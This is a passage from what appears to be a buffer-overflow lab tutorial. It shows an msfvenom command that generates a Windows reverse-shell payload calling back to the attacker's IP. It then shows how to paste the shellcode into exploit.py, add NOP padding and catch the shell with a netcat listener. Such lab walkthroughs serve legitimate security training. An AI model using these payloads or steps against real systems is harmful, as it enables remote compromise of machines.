- - -
### Generating Shellcode :

• Move to your Kali terminal.
• And run the following command :

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<our_IP> LPORT=9090 EXITFUNC=thread -f c -a x86 -b “\x00\x<...your_bad chars>”
```
**Note :** this is a x32 bit windows non-staged payload.

![Imgur](https://i.imgur.com/G9JJGhx.png)

Copy the generated C code strings and paste them into your **exploit.py**'s payload variable But inside brackets ; 
Like that : 
```sh
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"  
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"  
...test payload ☺☺☺☺☺☺☺☺  
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"  
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```

☐ Before saving the exploit.py 
☐ we will need some space in memory for the payload to unpack itself. 
☐ we can do this by setting the padding variable to a string of 16, 32, 8 or more...
         ☐ update the padding variable like this : 
```python
padding = "\x90" * 16
```

☐  Save the script. 
☐ Set up a listner. ( LPORT we specified ). 
☐ Restart Immunity and run the modified exploit.py script again. 
☐ Our netcat listener should catch a reverse shell!
- - -


